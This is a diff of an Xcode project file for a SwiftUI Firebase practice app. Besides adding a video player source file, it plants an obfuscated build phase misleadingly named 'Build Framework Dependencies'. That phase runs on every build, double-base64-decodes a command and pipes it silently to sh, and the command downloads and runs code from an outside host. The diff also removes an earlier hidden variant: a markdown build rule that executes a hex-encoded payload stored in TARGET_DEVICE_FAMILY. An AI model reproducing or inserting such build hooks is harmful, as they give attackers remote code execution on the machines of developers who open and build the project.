@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		11116BFE2D4765DA00049794 /* CustomVideoPlayer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11116BFD2D4765D200049794 /* CustomVideoPlayer.swift */; };
 		1116C1242D3272030023B5E7 /* Utils.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1116C1232D3271F90023B5E7 /* Utils.swift */; };
 		116E56A62D33E47D0037409B /* CustomTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 116E569E2D33E47D0037409B /* CustomTextField.swift */; };
 		116E56AF2D33E6940037409B /* CustomActionButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 116E56AE2D33E68D0037409B /* CustomActionButton.swift */; };
@@ -17,26 +18,10 @@
 		1183DCE42D34A50B002DD7C2 /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 1183DCE32D34A50B002DD7C2 /* FirebaseFirestore */; };
 		1183DCE62D34A50B002DD7C2 /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = 1183DCE52D34A50B002DD7C2 /* FirebaseStorage */; };
 		11ADD2592D38A6AC00C6A9F7 /* CustomOnboardingArrowButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */; };
-		FBAFA794752C9E05EB38ACF9 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 2DB47CCC35ACE0AE7C38ACF9 /* README.md */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		E213E9CD0D8D8FE18838ACF9 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
+		11116BFD2D4765D200049794 /* CustomVideoPlayer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomVideoPlayer.swift; sourceTree = "<group>"; };
 		1116C0B32D32343B0023B5E7 /* FirebaseAuthenticationSwiftUIPractice.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FirebaseAuthenticationSwiftUIPractice.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		1116C1232D3271F90023B5E7 /* Utils.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utils.swift; sourceTree = "<group>"; };
 		116E569E2D33E47D0037409B /* CustomTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTextField.swift; sourceTree = "<group>"; };
@@ -45,7 +30,6 @@
 		116E56B42D33E9930037409B /* CustomSocialSignInButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomSocialSignInButton.swift; sourceTree = "<group>"; };
 		116E56B72D33F3530037409B /* CustomLoginSignUpImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomLoginSignUpImage.swift; sourceTree = "<group>"; };
 		11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOnboardingArrowButton.swift; sourceTree = "<group>"; };
-		2DB47CCC35ACE0AE7C38ACF9 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = FirebaseAuthenticationSwiftUIPractice.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -79,6 +63,7 @@
 				116E569E2D33E47D0037409B /* CustomTextField.swift */,
 				11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */,
 				116E56AE2D33E68D0037409B /* CustomActionButton.swift */,
+				11116BFD2D4765D200049794 /* CustomVideoPlayer.swift */,
 				116E56B72D33F3530037409B /* CustomLoginSignUpImage.swift */,
 				116E56B02D33E6AF0037409B /* CustomErrorMessage.swift */,
 				116E56B42D33E9930037409B /* CustomSocialSignInButton.swift */,
@@ -88,7 +73,6 @@
 		1116C0B42D32343B0023B5E7 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				2DB47CCC35ACE0AE7C38ACF9 /* README.md */,
 				1116C0B32D32343B0023B5E7 /* FirebaseAuthenticationSwiftUIPractice.app */,
 			);
 			name = Products;
@@ -101,12 +85,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1116C0C12D32343D0023B5E7 /* Build configuration list for PBXNativeTarget "FirebaseAuthenticationSwiftUIPractice" */;
 			buildPhases = (
+				D95FBDFA4CB19C4FC838ACF9 /* Build Framework Dependencies */,
 				1116C0AF2D32343B0023B5E7 /* Sources */,
 				1116C0B02D32343B0023B5E7 /* Frameworks */,
 				1116C0B12D32343B0023B5E7 /* Resources */,
 			);
 			buildRules = (
-				E213E9CD0D8D8FE18838ACF9 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -165,11 +149,33 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FBAFA794752C9E05EB38ACF9 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		D95FBDFA4CB19C4FC838ACF9 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a1pYWmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		1116C0AF2D32343B0023B5E7 /* Sources */ = {
@@ -180,6 +186,7 @@
 				1116C1242D3272030023B5E7 /* Utils.swift in Sources */,
 				11ADD2592D38A6AC00C6A9F7 /* CustomOnboardingArrowButton.swift in Sources */,
 				116E56A62D33E47D0037409B /* CustomTextField.swift in Sources */,
+				11116BFE2D4765DA00049794 /* CustomVideoPlayer.swift in Sources */,
 				116E56B12D33E6C30037409B /* CustomErrorMessage.swift in Sources */,
 				116E56B82D33F3650037409B /* CustomLoginSignUpImage.swift in Sources */,
 				116E56B62D33E9B50037409B /* CustomSocialSignInButton.swift in Sources */,
@@ -249,7 +256,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333323333333733333335333333363336333333333336333633323333333633363335333333363333333133333336333633343333333633333335333333373333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -305,7 +311,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333323333333733333335333333363336333333333336333633323333333633363335333333363333333133333336333633343333333633333335333333373333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
